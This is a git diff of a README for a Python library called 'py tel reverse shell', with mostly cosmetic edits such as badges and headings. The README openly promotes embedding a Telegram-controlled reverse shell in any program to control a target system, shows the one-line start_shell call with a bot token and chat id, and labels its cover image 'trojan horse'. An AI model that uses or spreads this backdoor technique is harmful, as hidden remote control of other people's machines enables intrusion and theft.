@@ -2,10 +2,13 @@
 <img src='./cover.png' style="border: white;border-radius: 2pc;" alt='trojan horse'/>
 </p>
 
-## py_tel_reverse_shell 
-### the reverse shell in your telgram!
+# py tel reverse shell 
+![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
+> the reverse shell in your telgram!
 
-# What is this?
+<br>
+
+## What is this?
 This program is a Python library that you can use to put an inverted shell connected to Telegram in any program. And control the target system from within the telegram.
 
 # How does it work?
@@ -27,6 +30,7 @@ tel_shell.start_shell(bot_token=my_token,chat_id=my_chat_id)
 ```
 and over. You can easily put an inverted shell connected to Telegram in your program.
 
+<br>
 
 # options
 *You can send these words to the robot to get the answer.*
